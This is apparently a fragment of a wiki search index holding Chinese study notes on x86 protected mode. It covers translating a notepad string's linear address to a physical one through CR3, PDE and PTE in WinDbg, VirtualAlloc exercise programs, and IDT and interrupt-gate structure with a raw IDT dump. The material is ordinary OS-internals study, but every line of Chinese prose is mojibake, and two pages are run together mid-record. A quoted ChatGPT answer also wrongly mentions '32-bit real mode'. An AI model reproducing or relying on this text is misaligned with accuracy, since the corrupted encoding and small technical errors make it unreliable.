æ‰“å¼€notepadè¿›ç¨‹ï¼Œå°†CheatEngineé™„åŠ åœ¨notepadè¿›ç¨‹ä¸Š åœ¨CheatEngineä¸­æœç´¢åˆ°å­—ç¬¦ä¸²çš„çº¿æ€§åœ°å€ åœ¨è®°äº‹æœ¬ä¸­è¾“å…¥å­—ç¬¦ä¸²ï¼Œç„¶åç”¨CEç¬¬ä¸€æ¬¡æœè¯¥å­—ç¬¦ä¸²ï¼ŒCEé€‰stringï¼ŒUnicode ä¿®æ”¹å­—ç¬¦ä¸²ï¼ŒCEä¸­å­—ç¬¦ä¸²éšç€å˜åŠ¨çš„ï¼Œå°±æ˜¯è¯¥å­—ç¬¦ä¸²çœŸæ­£çš„çº¿æ€§åœ°å€ï¼Œå®šä½åˆ°çœŸæ­£çš„çº¿æ€§åœ°å€ä¸º000AA958 é€šè¿‡çº¿æ€§åœ°å€åœ¨windbgä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²çš„å®é™…ç‰©ç†åœ°å€ å°†çº¿æ€§åœ°å€æ‹†æˆ10-10-12çš„æ ¼å¼ 123456789000AA9580000 0000 0000 1010 1010 9580000 0000 00ï¼Œ000 1010 1010ï¼ŒAA958 windbgä¸­ä½¿ç”¨! process 0 0è·å–notepadè¿›ç¨‹çš„CR3ï¼Œä¸º1d141000 è®¡ç®—è¿‡ç¨‹ï¼š1d141000+0*4 !ddå‘½ä»¤æŸ¥çœ‹çš„æ˜¯ç‰©ç†å†…å­˜ï¼Œddå‘½ä»¤æŸ¥çœ‹çš„æ˜¯çº¿æ€§å†…å­˜ 123456789kd&gt; !dd 1d141000+0#1d141000 1cc29067 1d193067 1cf23067 00000000#1d141010 1d1dc067 00000000 00000000 00000000#1d141020 00000000 00000000 00000000 00000000#1d141030 00000000 00000000 00000000 00000000#1d141040 00000000 00000000 00000000 00000000#1d141050 00000000 00000000 00000000 00000000#1d141060 00000000 00000000 00000000 00000000#1d141070 00000000 00000000 00000000 00000000 å¾—åˆ°ä¸‹ä¸€ä¸ªåœ°å€1cc29067ï¼Œå3ä½æ˜¯å±æ€§ï¼Œè®¡ç®—æ—¶å†™æˆ0ã€‚ è®¡ç®—è¿‡ç¨‹ï¼š1cc29000+AA*4 123456789kd&gt; !dd 1cc29000+2A8#1cc292a8 1cce9067 1d14c067 1d31f067 1d1a1067#1cc292b8 1d022067 1cfa3067 1cde4067 1cd25067#1cc292c8 1cee6067 1cde8067 1cea7067 00000000#1cc292d8 00000000 00000000 00000000 00000000#1cc292e8 00000000 00000000 00000000 00000000#1cc292f8 00000000 00000000 00000000 00000000#1cc29308 00000000 00000000 00000000 00000000#1cc29318 00000000 00000000 00000000 00000000 å¾—åˆ°ä¸‹ä¸€ä¸ªåœ°å€1cce9067ï¼Œå3ä½æ˜¯å±æ€§ï¼Œè®¡ç®—æ—¶å†™æˆ0ã€‚ è®¡ç®—è¿‡ç¨‹ï¼š1cce9000+958 !dbä»¥å­—èŠ‚æ–¹å¼æ˜¾ç¤ºè¿™äº›åœ°å€çš„æ•°æ®ï¼Œå‘ç°äº†Hello World123çš„å­—æ · 12345678910kd&gt; !db 1cce9000+958#1cce9958 48 00 65 00 6c 00 6c 00-6f 00 20 00 57 00 6f 00 H.e.l.l.o. .W.o.#1cce9968 72 00 6c 00 64 00 31 00-32 00 33 00 00 00 00 00 r.l.d.1.2.3.....#1cce9978 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#1cce9988 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#1cce9998 00 00 00 00 0c 00 89 00-03 00 0a 00 a0 23 16 00 .............#..#1cce99a8 00 00 0a 00 78 01 0a 00-00 00 00 00 14 00 89 00 ....x...........#1cce99b8 05 00 03 00 a3 01 08 00-00 00 00 00 70 5e 0a 00 ............p^..#1cce99c8 68 b1 99 7c 00 a6 0a 00-00 00 00 00 00 00 00 00 h..|..... è¯¾åç»ƒä¹  åˆ›å»ºä¸¤ä¸ªè¿›ç¨‹ï¼Œç”³è¯·ä¸€ä¸ªç›¸åŒçš„å†…å­˜åœ°å€æ¯”å¦‚:0x401234,å¹¶å­˜å‚¨ä¸åŒçš„å†…å®¹ï¼Œåˆ†åˆ«æ‰¾åˆ°è¿™2ä¸ªè¿›ç¨‹ç›¸å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œçœ‹å†…å®¹æ˜¯ä»€ä¹ˆï¼Œè¯´è¯´ä½ çš„ç†è§£ã€‚ ç­”æ¡ˆä»£ç ä¸­çš„åœ°å€éƒ½æ˜¯çº¿æ€§åœ°å€ã€‚ä¸¤ä¸ªè¿›ç¨‹ï¼Œå³ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªçº¿æ€§åœ°å€0x401234ï¼Œå› ä¸ºCR3ä¸åŒï¼Œæœ€åå¯»åˆ°çš„ç‰©ç†åœ°å€æ˜¯ä¸ä¸€æ ·çš„ã€‚ä»£ç è¯æ˜ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼šä¸¤ä¸ªä¸åŒçš„ç¨‹åºï¼Œä½¿ç”¨åŒä¸€ä¸ªçº¿æ€§åœ°å€åŒä¸€ä¸ªç¨‹åºè¿è¡Œä¸¤æ¬¡ç¨‹åºAï¼Œç”¨Virtualallocéšæœºç”³è¯·ä¸€ä¸ªåœ°å€ï¼Œè¾“å‡ºè¿™ä¸ªçš„åœ°å€ã€‚123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // åˆ†é…å†…å­˜ int* p = (int*)VirtualAlloc(NULL, sizeof(int), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (p == NULL) &#123; printf(&quot;Memory allocation failed &quot;); return 1; &#125; // å­˜å‚¨å€¼ *p = 1; // æ‰“å°å†…å­˜åœ°å€ printf(&quot;Using VirtualAlloc to randomly apply for a memory address. &quot;); printf(&quot;Memory address: %p &quot;, p); //æš‚åœä½ getchar(); // é‡Šæ”¾å†…å­˜ VirtualFree(p, 0, MEM_RELEASE); return 0;&#125;ç¨‹åºBï¼Œç”¨Virtualallocç”³è¯·æŒ‡å®šå†…å­˜ï¼ˆç¨‹åºAè¾“å‡ºç”³è¯·åˆ°çš„åœ°å€ï¼‰ï¼Œè¿è¡Œã€‚1234567891011121314151617181920212223242526272829#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // æŒ‡å®šå†…å­˜åœ°å€ LPVOID lpAddress = (LPVOID)0x003A0000; // åˆ†é…å†…å­˜ int* p = (int*)VirtualAlloc(lpAddress, sizeof(int), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (p == NULL) &#123; printf(&quot;Memory allocation failed &quot;); return 1; &#125; // å­˜å‚¨å€¼ *p = 1; // æ‰“å°å†…å­˜åœ°å€ printf(&quot;Using VirtualAlloc to allocate a fixed address. &quot;); printf(&quot;Memory address: %p &quot;, p); //æš‚åœä½ getchar(); // é‡Šæ”¾å†…å­˜ VirtualFree(p, 0, MEM_RELEASE); return 0;&#125;1234çº¿æ€§åœ°å€3a0000æ‹†åˆ†0 //10 ;0*4=01110100000,3A0 //10 ;12F*4=E800 //12ç”¨windbgåˆ†åˆ«å»æŸ¥ã€‚ç¨‹åºAï¼ŒCR3ï¼š1c4ad000ç¨‹åºBï¼ŒCR3ï¼š1ce90000è¡¨æ ¼å¯¹æ¯”ç¨‹åºAï¼ˆéšæœºç”³è¯·å†…å­˜åœ°å€ï¼‰ç¨‹åºBï¼ˆç”³è¯·æŒ‡å®šå†…å­˜åœ°å€ï¼‰CR31c4ad0001ce90000å¯»PDEçš„windbgæŒ‡ä»¤!dd 1c4ad000+0!dd 1ce90000+0PDE1c3950671cffe067å¯»PTEçš„windbgæŒ‡ä»¤!dd 1c395000+E80!dd 1cffe000+E80PTE1c3db0671c9b5067ç‰©ç†é¡µåŸºå€1c3db0001c9b5000åç§»00å¯»ç‰©ç†é¡µå®é™…åœ°å€çš„windbgæŒ‡ä»¤!dd 1c3db000+0!dd 1c9b5000+0ç‰©ç†é¡µå®é™…åœ°å€ä¸Šå­˜çš„å€¼0000000100000001ä¸€ä¸ªç¨‹åºï¼Œç¼–è¯‘åï¼Œè¿è¡Œexeä¸¤æ¬¡ã€‚å› ä¸ºæ˜¯ä¸åŒçš„è¿›ç¨‹ï¼Œæ‰€ä»¥CR3ä¸åŒã€‚1234567891011#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tint x = 1;\tprintf(&quot;xçš„åœ°å€:%x &quot;,&amp;x); getchar();\treturn 0;&#125;1234çº¿æ€§åœ°å€12ff7cæ‹†åˆ†0 //10 ;0*4=001 0010 1111ï¼Œ12F //10 ;12F*4=4BCF7C //12ç¬¬1æ¬¡è¿è¡Œï¼ŒCR3ï¼š20f6a000ç¬¬2æ¬¡è¿è¡Œï¼ŒCR3ï¼š22016000è¡¨æ ¼å¯¹æ¯”ç¬¬ä¸€æ¬¡è¿è¡Œçš„ç¨‹åºç¬¬äºŒæ¬¡è¿è¡Œçš„ç¨‹åºCR320f6a00022016000å¯»PDEçš„windbgæŒ‡ä»¤!dd 20f6a000+0!dd 22016000+0PDE2128106721d95067å¯»PTEçš„windbgæŒ‡ä»¤!dd 21281000+4BC!dd 21d95000+4BCPTE20f0506721ed9067ç‰©ç†é¡µåŸºå€20f0500021ed9000åç§»F7CF7Cå¯»ç‰©ç†é¡µå®é™…åœ°å€çš„windbgæŒ‡ä»¤!dd 20f05000+F7C!dd 21ed9000+F7Cç‰©ç†é¡µå®é™…åœ°å€ä¸Šå­˜çš„å€¼0000000100000001"},{"title":"ä¸­æ–­é—¨","path":"/wiki/Protected_Mode/ä¸­æ–­é—¨.html","content":"IDTè¡¨ IDTï¼ˆInterrupt Descriptor Tableï¼‰è¡¨ï¼Œä¸­æ–­æè¿°ç¬¦è¡¨ï¼Œè¡¨ä¸­ä¿å­˜çš„æ˜¯å’Œä¸­æ–­å¤„ç†è¿‡ç¨‹æœ‰å…³çš„æè¿°ç¬¦ã€‚åŒGDTè¡¨ä¸€æ ·ï¼ŒIDTä¹Ÿæ˜¯ç”±ä¸€ç³»åˆ—æè¿°ç¬¦ç»„æˆï¼Œæ¯ä¸ªæè¿°ç¬¦å 8ä¸ªå­—èŠ‚ã€‚IDTè¡¨ä¸GDTè¡¨ä¸åŒï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ä¸ºNULLã€‚ ä½¿ç”¨r idtrè¯»å–IDTè¡¨åŸºå€ï¼Œr idtlè¯»å–IDTè¡¨çš„é•¿åº¦ã€‚ xpç³»ç»Ÿä¸­çœ‹ä¸€ä¸‹ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133kd&gt; r idtridtr=8003f400kd&gt; r idtlidtl=000007ffkd&gt; dq 8003f400 L0x1008003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000 00000000`000800008003f510 00000000`00080000 00000000`000800008003f520 00000000`00080000 00000000`000800008003f530 00000000`00080000 00000000`000800008003f540 00000000`00080000 00000000`000800008003f550 8053ee00`0008e9de 8053ee00`0008eae08003f560 8053ee00`0008ec80 8053ee00`0008f5c08003f570 8053ee00`0008e481 80548e00`000817808003f580 80538e00`0008db40 80538e00`0008db4a8003f590 80538e00`0008db54 80538e00`0008db5e8003f5a0 80538e00`0008db68 80538e00`0008db728003f5b0 80538e00`0008db7c 806d8e00`000827288003f5c0 80538e00`0008db90 80538e00`0008db9a8003f5d0 80538e00`0008dba4 80538e00`0008dbae8003f5e0 80538e00`0008dbb8 806d8e00`00083b708003f5f0 80538e00`0008dbcc 80538e00`0008dbd68003f600 80538e00`0008dbe0 806d8e00`000839cc8003f610 80538e00`0008dbf4 80538e00`0008dbfe8003f620 80538e00`0008dc08 80538e00`0008dc128003f630 80538e00`0008dc1c 80538e00`0008dc268003f640 80538e00`0008dc30 80538e00`0008dc3a8003f650 80538e00`0008dc44 80538e00`0008dc4e8003f660 80538e00`0008dc58 80538e00`0008dc628003f670 80538e00`0008dc6c 80538e00`0008dc768003f680 806d8e00`00082800 80538e00`0008dc8a8003f690 80538e00`0008dc94 80538e00`0008dc9e8003f6a0 80538e00`0008dca8 80538e00`0008dcb28003f6b0 80538e00`0008dcbc 80538e00`0008dcc68003f6c0 80538e00`0008dcd0 80538e00`0008dcda8003f6d0 80538e00`0008dce4 80538e00`0008dcee8003f6e0 80538e00`0008dcf8 80538e00`0008dd028003f6f0 80538e00`0008dd0c 80538e00`0008dd168003f700 80538e00`0008dd20 80538e00`0008dd2a8003f710 861f8e00`0008f044 86218e00`0008589c8003f720 80538e00`0008dd48 80538e00`0008dd528003f730 80538e00`0008dd5c 80538e00`0008dd668003f740 80538e00`0008dd70 80538e00`0008dd7a8003f750 80538e00`0008dd84 80538e00`0008dd8e8003f760 80538e00`0008dd98 80538e00`0008dda28003f770 80538e00`0008ddac 80538e00`0008ddb68003f780 80538e00`0008ddc0 80538e00`0008ddca8003f790 80538e00`0008ddd4 86078e00`0008edd48003f7a0 80538e00`0008dde8 80538e00`0008ddf28003f7b0 80538e00`0008ddfc 80538e00`0008de068003f7c0 80538e00`0008de10 80538e00`0008de1a8003f7d0 80538e00`0008de24 80538e00`0008de2e8003f7e0 80538e00`0008de38 80538e00`0008de428003f7f0 80538e00`0008de4c 80538e00`0008de568003f800 80538e00`0008de60 80538e00`0008de6a8003f810 86028e00`0008db3c 86398e00`00088c3c8003f820 80538e00`0008de88 80538e00`0008de928003f830 80538e00`0008de9c 80538e00`0008dea68003f840 80538e00`0008deb0 80538e00`0008deba8003f850 80538e00`0008dec4 80538e00`0008dece8003f860 80538e00`0008ded8 80538e00`0008dee28003f870 80538e00`0008deec 80538e00`0008def68003f880 80538e00`0008df00 80538e00`0008df0a8003f890 86188e00`000892f4 86208e00`000856648003f8a0 80538e00`0008df28 80538e00`0008df328003f8b0 80538e00`0008df3c 80538e00`0008df468003f8c0 80538e00`0008df50 80538e00`0008df5a8003f8d0 80538e00`0008df64 80538e00`0008df6e8003f8e0 80538e00`0008df78 80538e00`0008df828003f8f0 80538e00`0008df8c 80538e00`0008df968003f900 80538e00`0008dfa0 80538e00`0008dfaa8003f910 80538e00`0008dfb4 86258e00`000808948003f920 80538e00`0008dfc8 80538e00`0008dfd28003f930 80538e00`0008dfdc 80538e00`0008dfe68003f940 80538e00`0008dff0 80538e00`0008dffa8003f950 80538e00`0008e004 80538e00`0008e00e8003f960 80538e00`0008e018 80538e00`0008e0228003f970 80538e00`0008e02c 80538e00`0008e0368003f980 80538e00`0008e040 86328e00`000854ec8003f990 80538e00`0008e054 80538e00`0008e05e8003f9a0 86218e00`00082424 80538e00`0008e0728003f9b0 80538e00`0008e07c 80538e00`0008e0868003f9c0 80538e00`0008e090 80538e00`0008e09a8003f9d0 80538e00`0008e0a4 80538e00`0008e0ae8003f9e0 80538e00`0008e0b8 80538e00`0008e0c28003f9f0 80538e00`0008e0cc 80538e00`0008e0d68003fa00 80538e00`0008e0e0 806d8e00`000829848003fa10 80538e00`0008e0f4 80538e00`0008e0fe8003fa20 80538e00`0008e108 80538e00`0008e1128003fa30 80538e00`0008e11c 80538e00`0008e1268003fa40 80538e00`0008e130 80538e00`0008e13a8003fa50 80538e00`0008e144 80538e00`0008e14e8003fa60 80538e00`0008e158 80538e00`0008e1628003fa70 80538e00`0008e16c 80538e00`0008e1768003fa80 80538e00`0008e180 806d8e00`00081d348003fa90 80538e00`0008e194 80538e00`0008e19e8003faa0 80538e00`0008e1a8 80538e00`0008e1b28003fab0 80538e00`0008e1bc 80538e00`0008e1c68003fac0 80538e00`0008e1d0 80538e00`0008e1da8003fad0 80538e00`0008e1e4 80538e00`0008e1ee8003fae0 80538e00`0008e1f8 80538e00`0008e2028003faf0 80538e00`0008e20c 80538e00`0008e2168003fb00 80538e00`0008e220 806d8e00`00082f0c8003fb10 80538e00`0008e234 806d8e00`00082c708003fb20 80538e00`0008e248 80538e00`0008e2528003fb30 80538e00`0008e25c 80538e00`0008e2668003fb40 80538e00`0008e270 80538e00`0008e27a8003fb50 80538e00`0008e284 80538e00`0008e28e8003fb60 80538e00`0008e298 80538e00`0008e2a28003fb70 80538e00`0008e2a9 80538e00`0008e2b08003fb80 80538e00`0008e2b7 80538e00`0008e2be8003fb90 80538e00`0008e2c5 80538e00`0008e2cc8003fba0 80538e00`0008e2d3 80538e00`0008e2da8003fbb0 80538e00`0008e2e1 80538e00`0008e2e88003fbc0 80538e00`0008e2ef 80538e00`0008e2f68003fbd0 80538e00`0008e2fd 80538e00`0008e3048003fbe0 80538e00`0008e30b 806d8e00`000834648003fbf0 806d8e00`00083604 80538e00`0008e320 åœ¨32ä½ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªä¸­æ–­æè¿°ç¬¦çš„å¤§å°æ˜¯8å­—èŠ‚ã€‚æ‰€ä»¥ï¼Œè¦è®¡ç®—IDTä¸­æœ‰å¤šå°‘ä¸ªæè¿°ç¬¦ï¼Œä½ éœ€è¦æŠŠIDTLçš„å€¼åŠ 1ï¼ˆå› ä¸ºä»0å¼€å§‹è®¡æ•°ï¼‰ï¼Œç„¶åé™¤ä»¥æ¯ä¸ªæè¿°ç¬¦çš„å¤§å°ã€‚ 0x7ff (IDTLçš„å€¼) + 1 = 0x800 0x800 (è¿™æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„æ€»é•¿åº¦) / 8 (æ¯ä¸ªæè¿°ç¬¦çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½) = 0x100 æ‰€ä»¥ä½ çš„IDTåº”è¯¥åŒ…å«0x100æˆ–è€…åè¿›åˆ¶çš„256ä¸ªæè¿°ç¬¦ã€‚ IDTè¡¨ä¸­åŒ…å«3ç§é—¨æè¿°ç¬¦ï¼š ä»»åŠ¡é—¨æè¿°ç¬¦ ä¸­æ–­é—¨æè¿°ç¬¦ é™·é˜±é—¨æè¿°ç¬¦ å‡ç”¨äºæ§åˆ¶è½¬ç§»ã€‚ ä¸­æ–­é—¨æè¿°ç¬¦ ç»“æ„å›¾ ä¸­æ–­é—¨æè¿°ç¬¦ä¹Ÿæ˜¯æ®µæè¿°ç¬¦çš„ä¸€ç§ï¼Œæ‰€ä»¥éµå¾ªæ®µæè¿°ç¬¦çš„å­—æ®µç»“æ„ã€‚ä¸­æ–­é—¨æè¿°ç¬¦çš„ç»“æ„å¯ä»¥é€šè¿‡è°ƒç”¨é—¨ç»“æ„æ¥è¿›è¡Œç±»æ¯”å­¦ä¹ ï¼Œåœ¨ä¸­æ–­é—¨ä¸­ï¼Œè°ƒç”¨é—¨ç”¨æ¥å†™å‚æ•°æ•°ç›®çš„ä½è¢«æ¸…ç©ºï¼Œå› ä¸ºä¸­æ–­é—¨æ— æ³•ä¼ å‚ã€‚ä¸­æ–­é—¨ï¼ŒTypeåŸŸå’Œè°ƒç”¨é—¨æœ‰äº›ä¸ä¸€æ ·ï¼Œå…¶ä»–ä¸€æ ·ã€‚ å›¾ä¸­çš„Dä½ï¼š Dä½çš„å€¼ å«ä¹‰ 0 16ä½ä¸­æ–­é—¨ 1 32ä½ä¸­æ–­é—¨ ç”¨é€” ä¸­æ–­é—¨ç”¨é€”ï¼š ç³»ç»Ÿè°ƒç”¨ è°ƒè¯• è€çš„CPUï¼Œ3ç¯APIé€šè¿‡ä¸­æ–­é—¨è¿›0ç¯ï¼Œæ–°çš„CPUç”¨çš„å¿«é€Ÿè°ƒç”¨ã€‚ Windowsä¸­çš„ææƒæ–¹å¼å¹¶æœªä½¿ç”¨è°ƒç”¨é—¨ï¼Œè€Œæ˜¯ä½¿ç”¨äº†ä¸­æ–­é—¨ã€‚ æ–­ç”µèµ°2å·ä¸­æ–­ï¼ˆIDTç¬¬ä¸‰ä¸ªï¼‰ï¼ˆint 2ï¼‰ï¼šç”µè„‘ç”µæºçªç„¶è¢«æ‹”äº†ï¼Œèµ°2å·ä¸­æ–­ï¼Œå¤„ç†æ”¶å°¾å·¥ä½œã€‚ åŒé‡é”™è¯¯èµ°8å·ä¸­æ–­ï¼šå‡è®¾æˆ‘èµ°äº†INT 2ä¸­æ–­ï¼Œä½†æ˜¯åœ¨ä¸­æ–­é‡Œåˆå‡ºé”™äº†ï¼Œæ­¤æ—¶èµ°åŒé‡é”™è¯¯8å·ä¸­æ–­ã€‚ INT 2:8053ee00`0008f6e4ï¼Œä¸­æ–­é—¨ int 3:8053ee00`0008f864ï¼Œä¸­æ–­é—¨ int 8:00008500`00501198 123456kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c0 ä¸‹é¢è¡¨int 3ç±»å‹å†™çš„é™·é˜±é—¨ã€‚ä½†æ˜¯ä¸Šé¢æˆ‘æŸ¥è¡¨çœ‹çš„æ˜¯ä¸­æ–­é—¨ã€‚è€Œä¸”ï¼Œçœ‹å®Œæ•´ä¸ªIDTè¡¨ï¼Œwindowsæ˜¯æ²¡ä½¿ç”¨é™·é˜±é—¨çš„ã€‚ å’Œè°ƒç”¨é—¨çš„åŒºåˆ« åŒºåˆ« è°ƒç”¨é—¨ ä¸­æ–­é—¨ è°ƒç”¨æŒ‡ä»¤ CALL FARæŒ‡ä»¤ INTæŒ‡ä»¤ æŒ‡ä»¤åˆ†æ CALL CS:EIPä¸­çš„CSæ˜¯æ®µé€‰æ‹©å­ï¼Œç”±3éƒ¨åˆ†ç»„æˆ INT NæŒ‡ä»¤ä¸­çš„Nåªæ˜¯ç´¢å¼• æŸ¥çš„è¡¨ GDTè¡¨ IDTè¡¨ å‚æ•° å¯ä»¥å¸¦å‚æ•° æ— æ³•å¸¦å‚æ•° æƒé™æ£€æŸ¥ æ£€æŸ¥RPLå’ŒCPL åªæ£€æŸ¥CPL ä¸­æ–­é—¨æ‰§è¡Œæµç¨‹ æŒ‡ä»¤æ ¼å¼ï¼š 1INT N (Nä¸ºä¸­æ–­é—¨ç´¢å¼•å·) å…¶ä¸­ï¼ŒNæ˜¯ç´¢å¼•ï¼ŒN*8+IDTçš„åŸºå€ï¼Œå°±æ˜¯å…·ä½“çš„ä¸­æ–­é—¨æè¿°ç¬¦ æ‰§è¡Œæ­¥éª¤ï¼š å †æ ˆå˜åŒ–ï¼ˆç›¸æ¯”äºè°ƒç”¨é—¨ï¼Œä¸­æ–­é—¨çš„å‹æ ˆæ•°æ®å¤šäº†ä¸€ä¸ªEFLAGå¯„å­˜å™¨ï¼‰ åœ¨æ²¡æœ‰æƒé™åˆ‡æ¢æ—¶ï¼Œä¼šå‘å †æ ˆä¾æ¬¡å‹å…¥EFLAGã€CSå’ŒEIPï¼› å¦‚æœæœ‰æƒé™åˆ‡æ¢ï¼Œä¼šå‘å †æ ˆä¾æ¬¡å‹å…¥SSã€ESPã€EFLAGã€CSå’ŒEIPã€‚ CPUä¼šç´¢å¼•åˆ°IDTè¡¨ã€‚åé¢çš„Nè¡¨ç¤ºæŸ¥IDTè¡¨é¡¹çš„ä¸‹æ ‡ã€‚å¯¹æ¯”è°ƒç”¨é—¨ï¼Œä¸­æ–­é—¨æ²¡æœ‰äº†RPLï¼Œæ•…CPUåªä¼šæ ¡éªŒCPLã€‚ åœ¨ä¸­æ–­é—¨ä¸­,ä¸èƒ½é€šè¿‡RETFè¿”å›ï¼Œè€Œåº”è¯¥é€šè¿‡IRET/IRETDæŒ‡ä»¤è¿”å›ã€‚ï¼ˆå› ä¸ºå‹äº†RFLAGAå¯„å­˜å™¨ï¼‰ã€‚ ä¼šå‹å…¥EFLAGå¯„å­˜å™¨çš„åŸå› ï¼šEFLAGå¯„å­˜å™¨ä¸­æœ‰ä¸€ä¸ªIFï¼ˆInterupt Enable Flagï¼‰ä½ï¼Œä¸­æ–­ä½¿èƒ½æ ‡å¿—ã€‚ç”¨æ¥å†³å®šCPU æ˜¯å¦å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚. å½“IF=1 æ—¶ï¼ŒCPUå¯ä»¥å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ å½“IF=0 æ—¶ï¼ŒCPUä¸å“åº”CPUå¤–éƒ¨çš„å¯å±è”½ä¸­æ–­å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ IFæ ‡å¿—å¯¹ä¸å¯å±è”½ä¸­æ–­æ²¡æœ‰å½±å“ã€‚ å¯å±è”½ä¸­æ–­è¯·æ±‚ï¼šå¦‚é”®ç›˜è¾“å…¥ï¼Œé¼ æ ‡ç‚¹å‡»éƒ½æ˜¯ä¸€æ¬¡å¯å±è”½ä¸­æ–­è¯·æ±‚ã€‚ ä¸å¯å±è”½ä¸­æ–­è¯·æ±‚ï¼šCPUå¿…é¡»ç«‹å³æ— æ¡ä»¶å“åº”çš„è¯·æ±‚ï¼Œå¦‚ç”µæºæ–­ç”µï¼ŒCPUå¿…é¡»æ— æ¡ä»¶å“åº”ã€‚å®é™…ä¸Šï¼Œæ–­ç”µåCPUæœ‰ç”µå®¹ï¼Œè¿™ç‚¹ç”µé‡è¿˜èƒ½è·‘ä¸€ä¼šï¼Œç”¨æ¥åšå…³æœºçš„ä¿å­˜å·¥ä½œã€‚è¿™ä¸ªä¸­æ–­æ˜¯2å·ä¸­æ–­ï¼ŒINT 2ã€‚ åœ¨è¿›å…¥ä¸€ä¸ªä¸­æ–­åä¼šå°†IFä½ç½®0ï¼Œå±è”½å…¶ä»–ä¸­æ–­ã€‚ IFä½ï¼Œç¬¬9ä½ï¼Œä»å³å¾€å·¦æ•°ï¼Œç¬¬10ä¸ª iretå’ŒiretdæŒ‡ä»¤åŒºåˆ« chatGPT: IRET å’Œ IRETD éƒ½æ˜¯ x86 æ±‡ç¼–è¯­è¨€ä¸­ç”¨äºä»ä¸­æ–­æˆ–è€…å¼‚å¸¸è¿”å›çš„æŒ‡ä»¤ã€‚å®ƒä»¬çš„ä¸»è¦ä»»åŠ¡æ˜¯ä»å †æ ˆä¸­æ¢å¤å¤„ç†å™¨çŠ¶æ€ï¼ŒåŒ…æ‹¬æŒ‡ä»¤æŒ‡é’ˆï¼Œä»£ç æ®µé€‰æ‹©å­å’Œæ ‡å¿—å¯„å­˜å™¨çš„å€¼ã€‚ åœ¨ 16 ä½å’Œ 32 ä½çš„å®æ¨¡å¼ä¸‹ï¼ŒIRET æ˜¯ç”¨äºä»ä¸­æ–­æˆ–å¼‚å¸¸è¿”å›çš„æ ‡å‡†æŒ‡ä»¤ã€‚ åœ¨ 32 ä½çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ° IRETD æŒ‡ä»¤ï¼Œå®ƒæŒ‡çš„æ˜¯ â€œinterrupt return doubleâ€ï¼Œè¿™é‡Œçš„ â€œdoubleâ€ è¡¨ç¤ºçš„æ˜¯æ•°æ®å®½åº¦ï¼Œå› ä¸ºåœ¨ 32 ä½æ¨¡å¼ä¸‹ï¼Œè¿”å›åœ°å€ï¼Œæ®µå¯„å­˜å™¨ï¼Œæ ‡å¿—å¯„å­˜å™¨çš„å€¼éƒ½æ˜¯åŒå­—çš„ã€‚ ç„¶è€Œï¼Œå¾ˆå¤šæ±‡ç¼–å™¨ä¼šå°† IRET å’Œ IRETD å½“ä½œåŒä¸€æŒ‡ä»¤å¤„ç†ï¼Œåœ¨32ä½æ¨¡å¼ä¸‹å½“ä½œ IRETDï¼Œåœ¨16ä½æ¨¡å¼ä¸‹å½“ä½œ IRETï¼Œè¿™æ„å‘³ç€åœ¨å®è·µä¸­ï¼Œä¸¤è€…çš„ä½¿ç”¨å¯èƒ½æ˜¯å¯ä»¥äº’æ¢çš„ï¼Œå…·ä½“å–å†³äºä½ çš„æ±‡ç¼–å™¨æ˜¯å¦‚ä½•å¤„ç†è¿™äº›æŒ‡ä»¤çš„ã€‚ åœ¨64ä½çš„æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨ IRETQ (interrupt return quadword) æ¥å¤„ç†è¿”å›ä¸­æ–­æˆ–è€…å¼‚å¸¸ã€‚ æ€»çš„æ¥è¯´ï¼ŒIRET å’Œ IRETD çš„åŒºåˆ«ä¸»è¦å–å†³äºä½ æ­£åœ¨ä½¿ç”¨çš„å¤„ç†å™¨æ¨¡å¼å’Œä½ çš„æ±‡ç¼–å™¨å¦‚ä½•è§£é‡Šè¿™äº›æŒ‡ä»¤ã€‚ ç½‘ä¸Šçš„Blog è¯¥é“¾æ¥çš„ç»ƒä¹ 4ï¼šhttps://www.cnblogs.com/wingsummer/p/15353642.html 